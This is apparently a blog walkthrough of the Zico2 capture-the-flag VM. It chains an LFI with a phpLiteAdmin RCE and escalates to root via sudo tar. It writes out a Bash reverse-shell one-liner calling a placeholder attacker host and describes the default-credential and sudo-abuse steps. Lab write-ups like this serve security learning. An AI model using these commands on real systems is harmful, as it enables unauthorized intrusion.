Here we go. Walkthrough for [Zico2]([Vulnhub](https://www.vulnhub.com/entry/bulldog-2,246/)) is happening in 3....2....1.


 
      ****Spoiler Alert****          ****Spoiler Alert****




For me this was a sleeper of a CTF. I had the box right up to a low privilege shell in a matter of minutes, but popping a shell and escalating from there took much longer than I anticipated. It was a very informative and fun VM. Let's get to crack'n!

Initial Nmap shows HTTP, SSH, & RPC:

![Bulldog2 NmapOutput]({{ site.url }}/images/Zico2/nmap.JPG)

Let's see what's showing up on HTTP:

![Bulldog2 Base]({{ site.url }}/images/Zico2/base_page.JPG)

Zico's Shop? Looks ? Questionable...  
So looking at the source here shows us the following:  
![Bulldog2 Source]({{ site.url }}/images/Zico2/basepage_source_lfi.JPG)  

Let's see if view.php is susceptible to a Local File Inclusion (LFI) vulnerability here:  
![Bulldog2 LFI]({{ site.url }}/images/Zico2/lfi.JPG)  

Bingo! Although this appeared to be just one vulnerability that had to be chained to another to exploit this system. Let's ennumerate a little more using Nikto & Directory Buster:  
![Bulldog2 Nikto]({{ site.url }}/images/Zico2/nikto.JPG)
![Bulldog2 Dirb]({{ site.url }}/images/Zico2/dirb.JPG)  

Ok, dirb gave us quite a bit here to take a look at.  

If we browse to the /dbadmin directory we're hit with directory browsing with a single test_db.php file, and going to that file we see a login for a PHPLiteAdmin v1.9.3 instance.  
![Bulldog2 PHPLiteAdmin]({{ site.url }}/images/Zico2/phpliteadmin.JPG)   
A quick Google shows us that the default password for this installation is "admin". In this particular instance it is not changed after installation.  
Once logged in I was able to find two hashes for a "root" and "zico" account. They cracked fairly easily via Hashcat. Unfortunately I was not able to find any uses for these and it looks like these were red herrings <*)))><  

Not seeing anything obvious here let's search Exploit-DB:
![Bulldog2 Sploit]({{ site.url }}/images/Zico2/sploit.JPG)  

That's more like it, matching our version at 1.9.3, we see an RCE right up our alley.  

The RCE is pretty straight-forward. Creating a database with the .php extension in this version of PHPLiteAdmin, will not change the extension. So if we create one of these databases, create a table with PHP code, and use our previously found LFI to trigger the database file, the PHP code is interpreted. Let's see if we can actually make this work with a simple PHPInfo statement:  

![Bulldog2 Sploit_Test]({{ site.url }}/images/Zico2/exploit_test.JPG)  

Going from a simple PHPInfo command to uploading a shell took a bit longer to figure out syntax-wise:  

![Bulldog2 Shell_Up]({{ site.url }}/images/Zico2/shell_upload.JPG)  

This is a simple Bash script with the following quick shell syntax:  
	bash -i >& /dev/tcp/x.x.x.x/PORT 0>&1  
Triggering the reverse shell in the same way gives us low privilege access to the www-data account. After the shell was popped, I upgraded to PTY via:  
	python -c 'import pty; pty.spawn("/bin/bash")'
Poking around via the usual checks didn't turn up much. We have read access to many files in /home/zico though. I wonder if there are any passwords I can use here for additional escalations?  

![Bulldog2 WP]({{ site.url }}/images/Zico2/wp-config.JPG)  

Interesting. Zico chose his user account for the WordPress installation. Lets dump our current shell and SSH into his account to check sudo privileges:

![Bulldog2 Sudo]({{ site.url }}/images/Zico2/zico_sudo.JPG)  

Cool. Tar & Zip can be run as root with no password checks. I'm pretty sure this is the escalation path at this point, but how can we escalate with just these?  

I wasn't sure which one to focus on and so decided to check the .bash_history. There was evidence of Zico running _sudo -u root /bin/tar --usage_ so that's where we need to look!  

Checking the usage switch, I saw the _--to-command_ switch. This switch will take the contents of a tar'd file and run the specified commands against each line of the file. Googling a few examples I created another reverse shell Bash script similar to the one from earlier, tar'd the file, setup my NetCat listener on my attacker machine and ran the following:  

![Bulldog2 Trigger_Root]({{ site.url }}/images/Zico2/tar-command.JPG)  
![Bulldog2 Root_Shell]({{ site.url }}/images/Zico2/root_shell.JPG)  

Boom! Let's grab our flag:
